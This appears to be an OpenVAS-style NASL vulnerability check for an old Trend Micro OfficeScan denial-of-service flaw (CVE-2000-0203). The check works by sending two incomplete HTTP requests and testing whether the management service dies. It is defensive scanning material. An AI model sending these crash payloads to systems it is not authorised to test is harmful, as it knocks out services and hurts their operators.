CPE = "cpe:/a:trendmicro:officescan";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.11059" );
	script_version( "$Revision: 14193 $" );
	script_tag( name: "last_modification", value: "$Date: 2019-03-14 16:07:17 +0100 (Thu, 14 Mar 2019) $" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_bugtraq_id( 1013 );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:N/I:N/A:P" );
	script_cve_id( "CVE-2000-0203" );
	script_name( "Trend Micro OfficeScan Denial of service" );
	script_category( ACT_DENIAL );
	script_copyright( "This script is Copyright (C) 2002 Michel Arboi" );
	script_family( "Denial of Service" );
	script_dependencies( "gb_trend_micro_office_scan_detect_remote.sc" );
	script_mandatory_keys( "TrendMicro/OfficeScan/Installed/Remote" );
	script_tag( name: "solution", value: "Upgrade your software." );
	script_tag( name: "summary", value: "It was possible to kill the Trend Micro OfficeScan
  antivirus management service by sending an incomplete HTTP request." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("host_details.inc.sc");
attack1 = NASLString( "get /  \\r\\n" );
attack2 = NASLString( "GET /  \\r\\n" );
if(!port = get_app_port( cpe: CPE, service: "www" )){
	exit( 0 );
}
if(!get_app_location( port: port, cpe: CPE )){
	exit( 0 );
}
if(http_is_dead( port: port )){
	exit( 0 );
}
res = http_send_recv( port: port, data: attack1 );
if(http_is_dead( port: port )){
	security_message( port: port );
	exit( 0 );
}
res = http_send_recv( port: port, data: attack2 );
if(http_is_dead( port: port )){
	security_message( port: port );
	exit( 0 );
}
exit( 99 );

